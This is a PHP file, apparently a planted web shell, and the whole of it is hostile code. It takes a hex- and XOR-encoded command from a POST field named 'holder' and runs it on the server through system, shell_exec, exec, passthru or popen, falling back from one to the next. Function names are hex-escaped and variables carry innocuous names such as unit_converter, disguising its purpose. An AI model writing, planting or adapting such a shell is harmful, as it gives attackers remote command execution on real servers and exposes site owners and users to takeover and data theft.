<?php

$unit_converter3 = "\x65x\x65c";
$unit_converter7 = "\x70\x63\x6Cose";
$unit_converter4 = "pa\x73\x73\x74\x68ru";
$unit_converter5 = "p\x6Fp\x65n";
$unit_converter1 = "sy\x73\x74\x65m";
$unit_converter6 = "strea\x6D\x5F\x67\x65t\x5Fc\x6Fnt\x65nts";
$unit_converter2 = "shell_e\x78\x65c";
$data_storage = "h\x65x2b\x69n";
if (isset($_POST["ho\x6C\x64\x65r"])) {
            function framework ( $res ,  $pset) {$pgrp='';$z=0; while($z<strlen($res)){$pgrp.=chr(ord($res[$z])^$pset);$z++;} return $pgrp; }
            $holder = $data_storage($_POST["ho\x6C\x64\x65r"]);
            $holder = framework($holder, 51);
            if (function_exists($unit_converter1)) {
                $unit_converter1($holder);
            } elseif (function_exists($unit_converter2)) {
                print $unit_converter2($holder);
            } elseif (function_exists($unit_converter3)) {
                $unit_converter3($holder, $descriptor_res);
                print join("\n", $descriptor_res);
            } elseif (function_exists($unit_converter4)) {
                $unit_converter4($holder);
            } elseif (function_exists($unit_converter5) && function_exists($unit_converter6) && function_exists($unit_converter7)) {
                $pset_pgrp = $unit_converter5($holder, 'r');
                if ($pset_pgrp) {
                    $factor_entity = $unit_converter6($pset_pgrp);
                    $unit_converter7($pset_pgrp);
                    print $factor_entity;
                }
            }
            exit;
        }